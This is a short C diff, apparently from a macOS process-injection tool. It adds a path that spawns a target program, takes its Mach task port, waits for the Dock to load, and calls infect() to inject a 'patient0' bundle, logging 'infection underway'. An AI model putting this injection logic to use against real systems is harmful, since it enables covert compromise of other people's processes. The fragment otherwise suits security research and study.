@@ -322,7 +322,25 @@ int main(int argc, char **argv, char **envp) {
   }
 
   /* Use the same helper we use in run() */
-  install_pathogen_default(pathogen, pathogen_size, NULL, 0);
+  if (argc == 2) {
+    install_pathogen_default(pathogen, pathogen_size, NULL, 0);
+  } else {
+    pid = spawn(new_argv[0], new_argv, new_envp, &port, replace_me);
+    if (pid <= 0 && port == MACH_PORT_NULL) {
+      p0_logf(P0_ERR, "failed to launch '%s'", new_argv[0]);
+      return 1;
+    }
+    /* Give the Dock enough time to get loaded */
+    p0_logf(P0_INFO, "zzzzz");
+    sleep(3);
+
+
+    /* TODO: pad out bytes */
+    if (!infect(port, patient0_bundle, patient0_bundle_len, &thread)) {
+      p0_logf(P0_ERR, "failed to infect '%s'@%d", new_argv[0], pid);
+      return 1;
+    }
+  }
   p0_logf(P0_INFO, "infection underway");
   return 0;
 }
